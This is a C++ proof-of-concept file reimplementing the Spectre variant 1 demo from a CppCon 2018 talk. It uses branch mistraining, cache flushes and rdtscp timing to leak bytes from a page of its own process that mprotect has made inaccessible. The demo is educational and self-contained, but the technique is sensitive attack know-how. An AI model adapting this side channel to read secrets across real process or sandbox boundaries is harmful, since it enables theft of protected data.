// Based on CppCon 2018: Chandler Carruth “Spectre: Secrets, Side-Channels,
// Sandboxes, and Security”

#include <sys/mman.h>
#include <x86intrin.h>

#include <algorithm>
#include <array>
#include <cstdint>
#include <cstring>
#include <exception>
#include <iostream>
#include <limits>
#include <numeric>

__attribute__((noinline)) void force_read(uint8_t *p) {
  asm volatile("" : : "r"(*p) : "memory");
}

static int64_t cpu_time() {
  uint32_t aux;
  return __rdtscp(&aux); // get precise time stamp
}

template <typename Iter>
std::pair<Iter, Iter> get_top_two(Iter begin, Iter end) {
  Iter j = begin;
  Iter k = begin;
  for (auto i = begin; i != end; ++i) {
    if (*i > *j)
      std::tie(k, j) = std::tie(j, i);
    else if (*i > *k)
      k = i;
  }
  return {j, k};
}

char leak_byte(const uint8_t *private_data, int index) {
  // Assuming we are allowed to access byte 0 of private data

  static constexpr auto CACHE_LINE_SIZE = 512;
  static constexpr auto NUM_LINES = 256;

  // Turns out this should be static. Maybe some other stack accesses mess up
  // caching around the sides
  static auto timing_array = std::array<uint8_t, NUM_LINES * CACHE_LINE_SIZE>();
  // The 512 byte section of this array corresponding to private_data[index]
  // will be speculatively read into cache, reducing the latency of
  // future reads

  std::fill(timing_array.begin(), timing_array.end(), 1);

  auto element_at_line = [&](auto line) -> auto & {
    return timing_array[line * CACHE_LINE_SIZE];
  };

  // Slow variable to fit more instructions in before speculatively
  // taken branch abandoned
  const int *slow_size = new int{1};

  auto times = std::array<decltype(cpu_time()), NUM_LINES>{};
  auto scores = std::array<int, NUM_LINES>{};

  auto top = std::pair{scores.begin(), scores.begin()};

  for (int run = 0; run < 1000; ++run) {

    // flush cache lines so timing array only in mem
    for (int i = 0; i < NUM_LINES; ++i)
      _mm_clflush(&element_at_line(i));

    // the fun part
    for (int i = 0; i < 500; ++i) {
      _mm_clflush(slow_size);
      for (volatile int stall = 0; stall < 1000; ++stall)
        ; // wait until slow_size flushed

      // 9/10 accesses will be to index 0 (assumed valid)
      auto local_index = ((i + 1) % 10) ? 0 : index;

      // dereferencing slow_size takes long enough for it to do a read
      // before cpu realizes condition failed
      if (local_index < *slow_size)
        force_read(&element_at_line(private_data[local_index]));
    }

    // time access to an element in each of the 256 cache-line-sized
    // sections of timing_array
    for (int i = 0; i < NUM_LINES; ++i) {
      int shuffled_i = ((i * 167) + 13) & 0xff;
      // I'm assuming it's shuffled to prevent prefetching?
      // Either way, works far better with it shuffled
      uint8_t *timing_entry = &element_at_line(shuffled_i);
      auto start = cpu_time();
      force_read(timing_entry);
      times[shuffled_i] = cpu_time() - start;
    }

    auto t_avg = std::accumulate(times.begin(), times.end(), 0) / NUM_LINES;

    // What if the byte to leak is equal to private_data[0]?
    for (int i = 0; i < NUM_LINES; ++i)
      if (times[i] * 2 < t_avg && i != private_data[0])
        ++scores[i];

    top = get_top_two(scores.begin(), scores.end());

    // exit when there is a clear winner
    if (*top.first > (*top.second) * 2 + 200)
      return top.first - scores.begin();
  }

  std::cout << "[[[unlikely]]]:";
  return top.first - scores.begin();
}

int main() {
  constexpr intptr_t PAGE_SIZE = 4096;
  using TwoPages = typename std::aligned_storage<2 * PAGE_SIZE, PAGE_SIZE>::type;
  auto two_pages = std::make_unique<TwoPages>(); 
  auto private_data = reinterpret_cast<uint8_t *>(two_pages.get());

  auto *real_start = private_data + PAGE_SIZE;
  std::strcpy((char *)real_start, "Hello\n");

  // Just to demo that kernel level protections do(n't???) work
  if (mprotect((void *)real_start, PAGE_SIZE, PROT_NONE) == -1)
    throw std::runtime_error("mprotect failed");

  for (auto i = 0; i < 6; ++i)
    std::cout << leak_byte(private_data, PAGE_SIZE + i);
}
